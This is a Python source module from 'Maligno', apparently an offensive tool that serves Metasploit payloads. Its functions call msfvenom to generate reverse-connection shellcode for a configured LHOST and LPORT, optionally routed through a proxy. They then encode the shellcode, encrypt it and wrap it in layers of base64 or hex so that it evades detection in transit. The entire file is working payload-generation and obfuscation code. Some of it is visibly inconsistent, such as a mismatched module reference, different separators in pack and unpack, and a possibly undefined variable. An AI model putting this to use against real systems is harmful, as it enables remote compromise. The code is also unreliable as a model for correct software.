#!/usr/bin/python

################################################################
#                                                              #
# Maligno - A Metasploit payload server                        #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013-2015 Encripto AS. All rights reserved.        #
#                                                              #
# Maligno is licensed under the FreeBSD license.               #
# http://www.freebsd.org/copyright/freebsd-license.html        #
#                                                              #
################################################################

import os, sys, base64, urllib, subprocess
import malout


def pack_data(shellcode, cipher, profile_network_config, profile_response_config):

    block_size = int(profile_network_config["blocksize"])
    padding_char = profile_network_config["paddingchar"]
    encoding = profile_network_config["encoding"]
    encoding_rounds = int(profile_network_config["rounds"])
    prefix = ""
    suffix = ""

    try:
        prefix = profile_response_config["prefix"]

    except KeyError:
        prefix = ""

    try:
        suffix = profile_response_config["suffix"]

    except KeyError:
        suffix = ""

    plaintext = shellcode + ":" + str(block_size) + ":" + padding_char
    padded = plaintext + (block_size - len(plaintext) % block_size) * padding_char
    ciphertext = cipher.encrypt(padded)

    if encoding.upper() == "BASE64":
        for i in range(0, encoding_rounds):
            ciphertext = base64.b64encode(ciphertext)

    elif encoding.upper() == "HEX":
        for i in range(0, encoding_rounds):
            ciphertext = ciphertext.encode("hex")

    elif encoding.upper() == "BIN":
        ciphertext = ciphertext

    else:
        print ""
        libs.malout.print_error("No valid encoding server config parameter found.")
        libs.malout.print_info("Using Base64 by default...")
        for i in range(0, encoding_rounds):
            ciphertext = base64.b64encode(ciphertext)

    ciphertext = urllib.unquote(prefix.rstrip().lstrip()) + ciphertext + urllib.unquote(suffix.rstrip().lstrip())

    return ciphertext


def unpack_data(ciphertext, cipher):
    plaintext = cipher.decrypt(base64.b64decode(ciphertext)).split("#")
    padding_char = plaintext[2]
    data = plaintext[0].rstrip(padding_char)

    if data.find(":") == -1:
        data = None

    return data


def generate_shellcode(metasploit_config, server_config, msfpayload):

    msf_path = metasploit_config["path"]
    msf_payload = msfpayload["payload"]
    msf_lhost = msfpayload["lhost"]
    msf_lport = msfpayload["lport"]
    msf_encoder = msfpayload["encoder"]
    msf_bad_chars = msfpayload["badchars"]
    msf_iterations = msfpayload["iterations"]
    proxy_srv = server_config["addr"]
    proxy_port = server_config["proxyport"]

    s = ""
    if msf_payload.find("python") > -1:
        p = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s -f raw" %
                (msf_path, msf_payload, msf_lhost, msf_lport), stdout=subprocess.PIPE, shell=True)

        s = p.communicate()[0].split("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]")[1]
        s = s.replace("\n", "").replace("'", "").replace("(", "").replace(")", "").replace(" ", "").rstrip()

    else:
        if msf_payload.find("https_proxy") > -1:
            p = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread PayloadProxyHost=%s PayloadProxyPort=%s  PayloadProxyType=SOCKS -e %s -i %s -f c -b '%s'" %
                (msf_path, msf_payload, msf_lhost, msf_lport, proxy_srv, proxy_port, msf_encoder, msf_iterations, msf_bad_chars), stdout=subprocess.PIPE, shell=True)
        else:
            p = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread -e %s -i %s -f c -b '%s'" %
                (msf_path, msf_payload, msf_lhost, msf_lport, msf_encoder, msf_iterations, msf_bad_chars), stdout=subprocess.PIPE, shell=True)

        s = p.communicate()[0].split("unsigned char buf[] = ")[1]
        s = s.replace("\n", "").replace('"', "").replace(";", "").replace("+", "").replace(" ", "").rstrip()

    return s


def generate_failsafe_shellcode(metasploit_config, proxy_srv, proxy_port, msfpayload):

    msf_path = metasploit_config["path"]
    msf_payload = msfpayload["payload"]
    msf_lhost = msfpayload["lhost"]
    msf_lport = msfpayload["lport"]
    msf_encoder = msfpayload["encoder"]
    msf_bad_chars = msfpayload["badchars"]
    msf_iterations = msfpayload["iterations"]

    s = ""
    if msf_payload.find("https_proxy") > -1:
        p = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread PayloadProxyHost=%s PayloadProxyPort=%s  PayloadProxyType=HTTP -e %s -i %s -f c -b '%s'" %
            (msf_path, msf_payload, msf_lhost, msf_lport, proxy_srv, proxy_port, msf_encoder, msf_iterations, msf_bad_chars), stdout=subprocess.PIPE, shell=True)

    s = p.communicate()[0].split("unsigned char buf[] = ")[1]
    s = s.replace("\n", "").replace('"', "").replace(";", "").replace("+", "").replace(" ", "").rstrip()

    return s